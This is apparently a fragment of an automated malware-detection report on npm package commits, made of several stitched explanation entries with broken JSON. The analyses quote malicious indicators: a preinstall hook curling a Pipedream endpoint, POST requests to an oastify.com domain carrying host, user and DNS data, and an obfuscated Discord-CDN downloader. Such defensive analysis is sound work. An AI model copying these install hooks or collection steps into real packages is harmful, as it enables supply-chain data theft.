These behaviors are characteristic of credential harvesters or system reconnaissance tools."

    "explanation": "**File index.js**:\nCode: `POST request to oastify.com`\nReason: The code initiates unauthorized network requests to an Out-of-Band Application Security Testing (OAST) domain, which is a hallmark of data exfiltration in supply chain attacks.\n\n**File index.js**:\nCode: `collects sensitive system information including the home directory path, hostname, username, DNS server configurations, and the entire contents of package.json`\nReason: The script gathers extensive environment metadata and sensitive system identifiers that are not required for standard package functionality, indicating reconnaissance and information theft.\n\n**File Dynamic Analysis**:\nCode: `curl https://eo536ohsnextro9.m.pipedream.net`\nReason: Runtime execution confirmed multiple outbound connections to a Pipedream endpoint, a common service used by attackers to receive exfiltrated data from compromised environments.\n\n**Summary:** The commit is classified as malware due to clear evidence of data exfiltration and unauthorized network activity. Static analysis revealed the collection of sensitive system metadata and hardcoded OAST domains, while dynamic analysis confirmed the execution of commands (curl) attempting to transmit data to external, unverified third-party infrastructure."

    "explanation": "**File package.json**:\nCode: `\"preinstall\": \"curl https://eo536ohsnextro9.m.pipedream.net\"`\nReason: The package uses a preinstall hook to automatically execute an outbound network request to a third-party Pipedream URL. This is a classic indicator of a supply chain attack used for tracking installations or exfiltrating environment data.\n\n**File package.json**:\nCode: `\"pingback\": \"curl https://eo536ohsnextro9.m.pipedream.net\"`\nReason: A custom script is defined to communicate with an external service, which has no legitimate purpose in a standard library and suggests command-and-control or data exfiltration behavior.\n\n**File index.js**:\nCode: `64 lines removed (entire file content)`\nReason: The commit deletes the entire functional logic of the library. Gutting the original code while adding suspicious network scripts is a strong indicator of a malicious package takeover.\n\n**Summary:** The commit is classified as malware due to the combination of 'gutting' the library's actual functionality and introducing automated outbound network connections via npm lifecycle scripts (preinstall). Dynamic analysis confirms that the package immediately attempts to contact an external Pipedream endpoint upon installation, which is characteristic of telemetry exfiltration or a stage-one dropper in a supply chain attack."

It employs heavy obfuscation to hide logic that downloads an executable from a non-standard repository (Discord CDN) and executes it on the host system using child_process.exec. This behavior is characteristic of a trojan or downloader."
